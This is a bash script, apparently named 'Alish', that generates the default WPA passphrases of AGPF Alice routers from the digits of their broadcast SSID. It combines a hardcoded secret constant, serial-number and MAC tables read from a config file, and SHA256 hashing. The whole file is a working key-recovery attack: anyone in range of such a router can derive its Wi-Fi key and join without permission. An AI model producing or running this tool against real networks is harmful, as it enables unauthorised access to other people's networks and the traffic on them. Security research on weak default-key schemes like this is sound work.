#!/bin/bash

# Version of the script
VERSION='0.02'

# Possible configuration file paths
CONFIG_PATHS=('/usr/share/aliwe/config.txt' '/mnt/sdcard/config.txt' 'config.txt')

# Path to the sha256sum executable
OPENSSL=$(which sha256sum)

# Length of the expected SSID argument
EXPECTED_SSID_LENGTH=8

# SSID argument passed to the script
SSID_ARG=$2

# Predefined constant used in passphrase generation
ALIS="\x64\xC6\xDD\xE3\xE5\x79\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x91\x3F\xDC\xE8"

# Character set used for passphrase generation
PRE_INIT_CHARSET="0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123"

# Function to display version information
display_version() {
  printf 'Coded by Gianluca Boiano  -  v%s\n' "${VERSION}"
  exit 0
}

# Function to display help information
display_help() {
  printf '\nAlish   ---  A WPA passphrase generator script for AGPF Alice routers\n'
  printf 'usage: alish [<opts>]\n'
  printf '  <opts>  -h                       print this message\n'
  printf '          -r                       read from <config> file and print on console\n'
  printf '          -s  <SSID digits>        WPA passphrase generation based on SSID digits\n'
  printf '          -v                       display version information\n'
  exit 0
}

# Function to generate WPA passphrase
generate_wpa_passphrase() {
  # Convert MAC address to hex format
  complete_mac_hex=$(echo -en "$complete_mac" | sed "s/[[:xdigit:]]\{2\}/\\\x&/g")
  
  # Create a SHA256 digest
  digest=$(echo -en "$ALIS$serial_number$complete_mac_hex" | sha256sum)
  
  # Format the digest to uppercase
  formatted_digest=$(echo "$digest" | cut -c 1-48 | tr '[:lower:]' '[:upper:]')
  
  # Convert hex to bytes
  hex_to_byte=$(echo "$formatted_digest" | sed "s/[[:xdigit:]]\{2\}/\n&/g")
  
  # Convert hex to decimal index
  index_array=$(echo "ibase=16; obase=A; ${hex_to_byte}" | bc)

  # Generate the passphrase based on the index array
  for index in $index_array; do
    incremented_index=$((index + 1))
    wpa_passphrase+=$(echo $PRE_INIT_CHARSET | cut -c $incremented_index)
  done
}

# Function to convert SSID to MAC address
convert_ssid_to_mac() {
  for i in $(seq 0 2); do
    cycle_factor=$(echo "100000000*$i" | bc)
    total_cycle=$(echo "$SSID_ARG+$cycle_factor" | bc)
    sub_mac=$(printf '\n%2X' "$total_cycle")
    normalized_sub_mac=$(echo $sub_mac | cut -c 2-7)
    complete_mac=$mac$normalized_sub_mac
    
    printf '\nwith pad %i:\t\t' "$i"
    printf '%s\t\t\t' "$complete_mac"
    
    # Reset the WPA passphrase variable
    unset wpa_passphrase
    
    # Generate the WPA passphrase
    generate_wpa_passphrase
    printf "%s\n" "$wpa_passphrase"
  done
}

# Function to read the configuration file
read_configuration_file() {
  cat "$CONFIG_FILE"
  exit 0
}

# Function to generate passphrases based on the configuration file
generate_passphrases() {
  lines=$(grep \""$search_variable" "$CONFIG_FILE")
  IFS=$';\n'
  
  for line in $lines; do
    if [ ${#line} -eq 29 ]; then # Check line length
      serial_number_part1=$(echo "$line" | cut -c 6-10)
      k=$(echo "$line" | cut -c 12)
      q=$(echo "$line" | cut -c 14-21)
      mac=$(echo "$line" | cut -c 23-28)
    else
      serial_number_part1=$(echo "$line" | cut -c 6-10)
      k=$(echo "$line" | cut -c 12-13)
      q=$(echo "$line" | cut -c 15-22)
      mac=$(echo "$line" | cut -c 24-29)
    fi

    # Calculate the second part of the serial number
    num=$(echo "$SSID_ARG-$q" | bc)
    serial_number_part2=$(echo "$num/$k" | bc)
    serial_number=$(printf '%dX%07d' "$serial_number_part1" "$serial_number_part2")
    
    printf "\n\nSerial Number:\n"
    printf '%s' "$serial_number"
    printf "\n\nFor this SN you can have these MACs:\t\t\tand relative keys:\n"
    
    # Convert SSID to MAC
    unset IFS
    convert_ssid_to_mac
  done
  printf "\n"
}

# Function to handle SSID processing
process_ssid() {
  if [ -f "$CONFIG_FILE" ]; then
    if [ -z "$SSID_ARG" ]; then
      printf 'Missing parameter\n'
      exit 1
    elif [ ! ${#SSID_ARG} -eq $EXPECTED_SSID_LENGTH ]; then # Check SSID length
      printf 'Please type 8 digits\n'
      exit 1
    fi
    
    search_variable=$(echo "$SSID_ARG" | cut -c 1-3)
    count=$(grep -c "$search_variable" "$CONFIG_FILE") # Count occurrences in the config file
    
    if [ "$count" -eq 0 ]; then
      printf 'No entry found in config file\n'
    else
      printf '%d entries found\n' "$count"
      printf "Summary for Alice-%s:" "$SSID_ARG"
      generate_passphrases
    fi
  else
    printf 'File not found\n'
  fi
}

# Function to process command-line arguments
process_arguments() {
  case "$1" in
    -h) display_help ;;
    -r) read_configuration_file ;;
    -s) process_ssid ;;
    -v) display_version ;;
    -*) display_help ;;
    *) echo 'Please type -h for details' ;;
  esac
}

# Preliminary checks
if [ ! -e "$OPENSSL" ]; then
  printf "OpenSSL executable not found. Please install it.\n"
  exit 1
fi

# Check for the existence of configuration files
for dir in "${CONFIG_PATHS[@]}"; do
  if [ -f "$dir" ]; then
    break
  fi 
done
CONFIG_FILE=$dir

# Process the command-line arguments
process_arguments "$@"
